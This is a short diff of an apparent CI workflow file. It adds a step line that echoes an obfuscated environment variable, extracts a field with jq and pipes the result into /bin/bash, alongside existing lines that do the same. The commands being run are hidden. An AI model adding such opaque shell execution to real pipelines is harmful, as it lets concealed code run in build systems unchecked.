@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$gfpia2880" | jq -r .rsl25577 | /bin/bash
           echo $a586 | jq -r .p3 | /bin/bash
           echo $ggdp413 | jq -r .aebdc82129 | /bin/bash
+          echo $yarl29 | jq -r .f0856 | /bin/bash
 
       - name: Save output
         if: always()
